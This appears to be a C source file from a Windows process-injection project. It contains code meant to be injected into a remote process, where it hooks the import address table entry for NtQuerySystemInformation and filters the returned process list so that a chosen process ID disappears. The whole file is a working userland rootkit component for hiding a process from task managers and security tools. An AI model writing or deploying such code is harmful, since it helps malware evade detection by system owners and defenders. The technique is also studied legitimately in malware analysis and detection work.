/*********************************************************
These functions will be injected to the remote process.
*********************************************************/

#include "pch.h"
#include "injected.h"

int Hook(INJDATA *pData) 
{
	PIMAGE_DOS_HEADER dosHeader;
	PIMAGE_NT_HEADERS NTHeader;
	PIMAGE_OPTIONAL_HEADER optionalHeader;
	IMAGE_DATA_DIRECTORY importDirectory;
	PIMAGE_IMPORT_DESCRIPTOR importDescriptor;

	DWORD_PTR baseAddress = (DWORD_PTR)pData->fnGetModuleHandle(NULL);

	dosHeader = (PIMAGE_DOS_HEADER)(baseAddress);
	NTHeader = (PIMAGE_NT_HEADERS)(baseAddress + dosHeader->e_lfanew);
	optionalHeader = &NTHeader->OptionalHeader;
	importDirectory = optionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(baseAddress + importDirectory.VirtualAddress);

	int index = 0;
	char *dllName;
	// Look for the DLL which includes the function for hooking
	while (importDescriptor[index].Characteristics != 0)
	{
		dllName = (char *)(baseAddress + importDescriptor[index].Name);
		if (!pData->fnStrcmp(pData->dllToHook, dllName))
			break;
		index++;
	}

	// exit if the DLL is not found in import directory
	if (importDescriptor[index].Characteristics == 0)
	{
		return 0;
	}

	// Search for requested function in the DLL
	PIMAGE_THUNK_DATA thunkILT; // Import Lookup Table - names
	PIMAGE_THUNK_DATA thunkIAT; // Import Address Table - addresses
	PIMAGE_IMPORT_BY_NAME nameData;

	thunkILT = (PIMAGE_THUNK_DATA)(baseAddress + importDescriptor[index].OriginalFirstThunk);
	thunkIAT = (PIMAGE_THUNK_DATA)(baseAddress + importDescriptor[index].FirstThunk);
	if (thunkIAT == NULL || thunkILT == NULL)
	{
		return 0;
	}
	
	while ((thunkILT->u1.AddressOfData != 0) & (!(thunkILT->u1.Ordinal & IMAGE_ORDINAL_FLAG)))
	{
		nameData = (PIMAGE_IMPORT_BY_NAME)(baseAddress + thunkILT->u1.AddressOfData);
		if (!pData->fnStrcmp(pData->funcToHook, (char *)nameData->Name))
			break;
		thunkIAT++;
		thunkILT++;
	}


	// Hook IAT: Write over function pointer
	DWORD dwOld = NULL;
	pData->fnOriginal = (_NtQuerySystemInformation)thunkIAT->u1.Function;
	pData->fnVirtualProtect((LPVOID)&(thunkIAT->u1.Function), sizeof(DWORD_PTR), PAGE_READWRITE, &dwOld);
	thunkIAT->u1.Function = (DWORD_PTR)pData->fnHooked;
	pData->fnVirtualProtect((LPVOID)&(thunkIAT->u1.Function), sizeof(DWORD_PTR), dwOld, NULL);

	return 1;
}
int AfterHook() { return 2; }


int Unhook(INJDATA *pData)
{
	pData->fnHooked = pData->fnOriginal;
	pData->fnHook(pData);
	return 1;
}
int AfterUnhook() { return 3; }


NTSTATUS WINAPI HookedNtQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
)
{
	// INJDATA pointer. 
	// Must be patched at runtime!
	INJDATA *pData = (INJDATA*)DUMMY_ADDR;

	NTSTATUS status = pData->fnOriginal(
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);
	PSYSTEM_PROCESS_INFORMATION previous, current;

	if (SystemInformationClass == SystemProcessInformation && NT_SUCCESS(status))
	{
		previous = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		current = (PSYSTEM_PROCESS_INFORMATION)((unsigned char*)previous + previous->NextEntryOffset);

		while (previous->NextEntryOffset)
		{
			if ((DWORD)(current->UniqueProcessId) == pData->hiddenPID) {
				// remove current from the linked list
				if (current->NextEntryOffset) 
				{
					previous->NextEntryOffset += current->NextEntryOffset;
				}
				else
				{
					previous->NextEntryOffset = 0;
				}
			}
			previous = current;
			current = (PSYSTEM_PROCESS_INFORMATION)((unsigned char*)previous + previous->NextEntryOffset);
		}
	}
	return status;
}
int AfterHookedNtQuerySystemInformation() { return 4; }
